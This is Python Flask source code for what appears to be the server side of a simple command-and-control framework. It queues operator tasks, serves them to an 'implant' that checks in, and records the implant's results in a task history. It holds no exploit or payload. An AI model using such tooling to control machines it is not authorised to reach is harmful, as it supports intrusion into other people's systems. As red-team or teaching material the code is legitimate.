import uuid
import json

from flask import request, Response
from flask_restful import Resource
from database.db import initialize_db
from database.models import Task, Result, TaskHistory

class Tasks(Resource):
    #list Tasks
    def get(self):
        #Add behavior for GET here:
        tasks = Task.objects().to_json()
        return Response(tasks, mimetype="application/json", status=200)

    #Add Tasks
    def post(self):
        #Add behavior for POST here:
        body = request.get_json()
        json_obj = json.loads(json.dumps(body))
        #Get the number of Task objects in the Request
        obj_num = len(body)
        #For each Task object, add it to the db
        for i in range(len(body)):
            #add a UUID to each task object for tracking
            json_obj[i]['task_id'] = str(uuid.uuid4())
            #save task object to db
            Task(**json_obj[i]).save()
            #Load the options provided for the task into an array for tracking history
            task_options = []
            for key in json_obj[i].keys():
                #anything that comes after task_type and task_id is treated as an option
                if (key != "task_type" and key != "task_id"):
                    task_options.append(key +": " + json_obj[i][key])
            #Add to task history
            TaskHistory(
                    task_id=json_obj[i]['task_id'],
                    task_type=json_obj[i]['task_type'],
                    task_object=json.dumps(json_obj),
                    task_options=task_options,
                    task_results=""
            ).save()
        #return the last Task objects that were added
        return Response(Task.objects.skip(Task.objects.count() - obj_num).to_json(), mimetype="application/json", status=200)

class Results(Resource):
    #ListResults
    def get(self):
        #add GET behavior:
        results = Result.objects().to_json()
        return Response(results, mimetype="application.json", status=200)

    # AddResults
    def post(self):
        # Check if results from the implant are populated
        if str(request.get_json()) != '{}':
            #Parse out the result JSON that we want to add to the database
            body = request.get_json()
            print("Received implant response: {}".format(body))
            json_obj = json.loads(json.dumps(body))
            #Add a result UUID to each result object for tracking
            json_obj['result_id']= str(uuid.uuid4())
            Result(**json_obj).save()
            #Serve latest tasks to implant
            tasks = Task.objects().to_json()
            #Clear tasks so they dont' execute twice
            Task.objects().delete()
            return Response(tasks, mimetype="application/json", status=200)
        else:
            #Serve latest tasks to implant
            tasks = Task.objects().to_json()
            #Clear tasks so they don't execute twice
            Task.objects().delete()
            return Response(tasks, mimetype="application/json", status=200)

class History(Resource):
    def get(self):
            #Get all the task history objects so we can return them to the user
            task_history = TaskHistory.objects().to_json()
            #Update any served tasks with results from implant
            #Get all the result objects and return them to the user
            results = Result.objects().to_json()
            json_obj = json.loads(results)
            # Format each result from the implant to be more friendly for conspumption/display
            result_obj_collection=[]
            for i in range(len(json_obj)):
                for field in json_obj[i]:
                    result_obj = {
                        "task_id": field,
                        "task_results": json_obj[i][field]
                    }
                    result_obj_collection.append(result_obj)
            #For each result in the collection, check corresponding task ID and if
            #there's a match, update it with the results. This is hacky and there's probably
            # a more elegant solution to update tasks with their results when they come in...
            for result in result_obj_collection:
                if TaskHistory.objects(task_id=result["task_id"]):
                    TaskHistory.objects(task_id=result["task_id"]).update_one(set__task_results=result["task_results"])
            return Response(task_history, mimetype="application/json", status=200)
